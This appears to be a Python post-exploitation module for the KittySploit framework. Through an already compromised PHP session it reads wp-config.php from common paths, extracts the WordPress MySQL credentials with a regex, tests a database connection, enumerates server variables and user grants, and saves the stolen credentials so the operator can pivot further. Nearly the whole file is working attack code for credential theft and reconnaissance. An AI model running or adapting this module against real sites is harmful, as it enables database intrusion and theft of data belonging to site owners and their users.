from kittysploit import *
import re

class Module(Post):

	__info__ = {
		"name": "WordPress MySQL Connection",
		"description": "Extract MySQL credentials from wp-config.php and create MySQL session",
		"author": "KittySploit Team",
		"session_type": SessionType.PHP,
		"arch": Arch.PHP,
	}	
	
	wp_config_path = OptString("wp-config.php", "Path to wp-config.php file", False)
	
	def run(self):
		try:
			# Try to find wp-config.php in common locations
			possible_paths = [
				self.wp_config_path,
				"wp-config.php",
				"../wp-config.php",
				"../../wp-config.php",
				"/var/www/html/wp-config.php",
				"/var/www/wp-config.php",
				"../wp-config.php",
			]
			
			wp_config_content = None
			wp_config_path_found = None
			
			# Try to read wp-config.php
			for path in possible_paths:
				read_code = f"""
$path = '{path.replace("'", "\\'")}';
if (file_exists($path)) {{
	echo file_get_contents($path);
}} else {{
	echo 'FILE_NOT_FOUND';
}}
"""
				result = self.cmd_execute(read_code)
				if result and 'FILE_NOT_FOUND' not in result:
					wp_config_content = result
					wp_config_path_found = path
					break
			
			if not wp_config_content:
				raise ProcedureError(FailureType.NotFound, "wp-config.php not found. Please specify the correct path.")
			
			print_success(f"Found wp-config.php at: {wp_config_path_found}")
			
			# Extract MySQL credentials using regex
			def extract_define(content, name):
				pattern = rf"define\s*\(\s*['\"]{name}['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\);"
				match = re.search(pattern, content, re.IGNORECASE)
				if match:
					return match.group(1)
				return None
			
			# Extract credentials
			db_name = extract_define(wp_config_content, 'DB_NAME')
			db_user = extract_define(wp_config_content, 'DB_USER')
			db_password = extract_define(wp_config_content, 'DB_PASSWORD')
			db_host = extract_define(wp_config_content, 'DB_HOST')
			
			if not db_name or not db_user or not db_password:
				raise ProcedureError(FailureType.NotAccess, "Could not extract MySQL credentials from wp-config.php")
			
			# Parse DB_HOST (can be host:port or just host)
			db_host_parsed = db_host if db_host else 'localhost'
			db_port = 3306
			if ':' in db_host_parsed:
				parts = db_host_parsed.split(':')
				db_host_parsed = parts[0]
				try:
					db_port = int(parts[1])
				except:
					db_port = 3306
			
			print_info(f"MySQL Host: {db_host_parsed}")
			print_info(f"MySQL Port: {db_port}")
			print_info(f"MySQL Database: {db_name}")
			print_info(f"MySQL Username: {db_user}")
			print_success("MySQL Password: [REDACTED]")
			
			# Test connection
			def escape_php_string(s):
				return s.replace('\\', '\\\\').replace("'", "\\'")
			
			host_escaped = escape_php_string(db_host_parsed)
			user_escaped = escape_php_string(db_user)
			pass_escaped = escape_php_string(db_password)
			db_escaped = escape_php_string(db_name)
			
			# Check if MySQL extension is available
			check_ext = self.cmd_execute("""
if(extension_loaded('mysqli')) {
	echo 'mysqli';
} elseif(extension_loaded('mysql')) {
	echo 'mysql';
} else {
	echo 'none';
}
""")
			
			if not check_ext or check_ext.strip() == 'none':
				raise ProcedureError(FailureType.NotAccess, "MySQL extension (mysqli or mysql) is not available")
			
			ext_type = check_ext.strip()
			print_success(f"MySQL extension found: {ext_type}")
			
			# Test connection
			if ext_type == 'mysqli':
				test_code = f"""
$host = '{host_escaped}';
$port = {db_port};
$user = '{user_escaped}';
$pass = '{pass_escaped}';
$db = '{db_escaped}';

$mysqli = @new mysqli($host, $user, $pass, $db, $port);
if ($mysqli->connect_error) {{
	echo 'CONNECTION_FAILED: ' . $mysqli->connect_error;
	exit;
}}
echo 'CONNECTION_SUCCESS';
$mysqli->close();
"""
			else:
				test_code = f"""
$host = '{host_escaped}';
$port = {db_port};
$user = '{user_escaped}';
$pass = '{pass_escaped}';
$db = '{db_escaped}';

$link = @mysql_connect($host . ':' . $port, $user, $pass);
if (!$link) {{
	echo 'CONNECTION_FAILED: ' . mysql_error();
	exit;
}}
if ($db) {{
	@mysql_select_db($db, $link);
}}
echo 'CONNECTION_SUCCESS';
mysql_close($link);
"""
			
			test_result = self.cmd_execute(test_code)
			if not test_result or 'CONNECTION_FAILED' in test_result:
				raise ProcedureError(FailureType.NotAccess, f"Failed to connect to MySQL: {test_result}")
			
			print_success("MySQL connection test successful!")
			
			# Get MySQL information
			if ext_type == 'mysqli':
				info_code = f"""
$host = '{host_escaped}';
$port = {db_port};
$user = '{user_escaped}';
$pass = '{pass_escaped}';
$db = '{db_escaped}';

$mysqli = @new mysqli($host, $user, $pass, $db, $port);
if ($mysqli->connect_error) {{
	echo 'CONNECTION_FAILED';
	exit;
}}

$info = array();
$info['MySQL Version'] = $mysqli->server_info;
$info['MySQL Client Version'] = $mysqli->client_info;
$info['Server Host'] = $mysqli->host_info;
$info['Protocol Version'] = $mysqli->protocol_version;
$info['Character Set'] = $mysqli->character_set_name();
$info['Current Database'] = $mysqli->query("SELECT DATABASE()")->fetch_row()[0];
$info['Current User'] = $mysqli->query("SELECT USER()")->fetch_row()[0];
$info['Current Time'] = $mysqli->query("SELECT NOW()")->fetch_row()[0];

// Get MySQL variables
$vars = array();
$result = $mysqli->query("SHOW VARIABLES LIKE 'version%'");
while ($row = $result->fetch_assoc()) {{
	$vars[$row['Variable_name']] = $row['Value'];
}}
$result->free();

$result = $mysqli->query("SHOW VARIABLES LIKE 'datadir'");
if ($row = $result->fetch_assoc()) {{
	$info['Data Directory'] = $row['Value'];
}}
$result->free();

$result = $mysqli->query("SHOW VARIABLES LIKE 'basedir'");
if ($row = $result->fetch_assoc()) {{
	$info['Base Directory'] = $row['Value'];
}}
$result->free();

$result = $mysqli->query("SHOW VARIABLES LIKE 'socket'");
if ($row = $result->fetch_assoc()) {{
	$info['Socket'] = $row['Value'];
}}
$result->free();

$result = $mysqli->query("SHOW VARIABLES LIKE 'port'");
if ($row = $result->fetch_assoc()) {{
	$info['Port'] = $row['Value'];
}}
$result->free();

// Get privileges
$result = $mysqli->query("SHOW GRANTS");
$grants = array();
while ($row = $result->fetch_row()) {{
	$grants[] = $row[0];
}}
$result->free();

echo "=== MySQL Server Information ===" . PHP_EOL;
foreach ($info as $key => $value) {{
	echo sprintf("%-25s: %s" . PHP_EOL, $key, $value);
}}

echo PHP_EOL . "=== MySQL Variables ===" . PHP_EOL;
foreach ($vars as $key => $value) {{
	echo sprintf("%-25s: %s" . PHP_EOL, $key, $value);
}}

echo PHP_EOL . "=== User Privileges ===" . PHP_EOL;
foreach ($grants as $grant) {{
	echo $grant . PHP_EOL;
}}

$mysqli->close();
"""
			else:
				info_code = f"""
$host = '{host_escaped}';
$port = {db_port};
$user = '{user_escaped}';
$pass = '{pass_escaped}';
$db = '{db_escaped}';

$link = @mysql_connect($host . ':' . $port, $user, $pass);
if (!$link) {{
	echo 'CONNECTION_FAILED';
	exit;
}}
if ($db) {{
	@mysql_select_db($db, $link);
}}

$info = array();
$info['MySQL Version'] = mysql_get_server_info($link);
$info['MySQL Client Version'] = mysql_get_client_info();
$info['Current Database'] = mysql_result(mysql_query("SELECT DATABASE()", $link), 0);
$info['Current User'] = mysql_result(mysql_query("SELECT USER()", $link), 0);
$info['Current Time'] = mysql_result(mysql_query("SELECT NOW()", $link), 0);

// Get MySQL variables
$vars = array();
$result = mysql_query("SHOW VARIABLES LIKE 'version%'", $link);
while ($row = mysql_fetch_assoc($result)) {{
	$vars[$row['Variable_name']] = $row['Value'];
}}

$result = mysql_query("SHOW VARIABLES LIKE 'datadir'", $link);
if ($row = mysql_fetch_assoc($result)) {{
	$info['Data Directory'] = $row['Value'];
}}

$result = mysql_query("SHOW VARIABLES LIKE 'basedir'", $link);
if ($row = mysql_fetch_assoc($result)) {{
	$info['Base Directory'] = $row['Value'];
}}

$result = mysql_query("SHOW VARIABLES LIKE 'socket'", $link);
if ($row = mysql_fetch_assoc($result)) {{
	$info['Socket'] = $row['Value'];
}}

$result = mysql_query("SHOW VARIABLES LIKE 'port'", $link);
if ($row = mysql_fetch_assoc($result)) {{
	$info['Port'] = $row['Value'];
}}

// Get privileges
$result = mysql_query("SHOW GRANTS", $link);
$grants = array();
while ($row = mysql_fetch_row($result)) {{
	$grants[] = $row[0];
}}

echo "=== MySQL Server Information ===" . PHP_EOL;
foreach ($info as $key => $value) {{
	echo sprintf("%-25s: %s" . PHP_EOL, $key, $value);
}}

echo PHP_EOL . "=== MySQL Variables ===" . PHP_EOL;
foreach ($vars as $key => $value) {{
	echo sprintf("%-25s: %s" . PHP_EOL, $key, $value);
}}

echo PHP_EOL . "=== User Privileges ===" . PHP_EOL;
foreach ($grants as $grant) {{
	echo $grant . PHP_EOL;
}}

mysql_close($link);
"""
			
			info_result = self.cmd_execute(info_code)
			if info_result:
				print_info("MySQL Information:")
				print_info(info_result)
			
			# Store credentials in session data for MySQL listener/shell
			if hasattr(self, 'framework') and self.framework and hasattr(self.framework, 'session_manager'):
				session_id_value = self.session_id.value if hasattr(self.session_id, 'value') else str(self.session_id)
				if session_id_value:
					session = self.framework.session_manager.get_session(session_id_value)
					if session:
						# Store MySQL credentials in session data
						if not session.data:
							session.data = {}
						session.data['mysql_host'] = db_host_parsed
						session.data['mysql_port'] = db_port
						session.data['mysql_username'] = db_user
						session.data['mysql_password'] = db_password
						session.data['mysql_database'] = db_name
						print_info("MySQL credentials stored in session data")
						print_info("You can now use MySQL modules or create a MySQL session")
			
			return True
			
		except ProcedureError:
			raise
		except Exception as e:
			raise ProcedureError(FailureType.Unknown, f"Error extracting WordPress MySQL credentials: {e}")

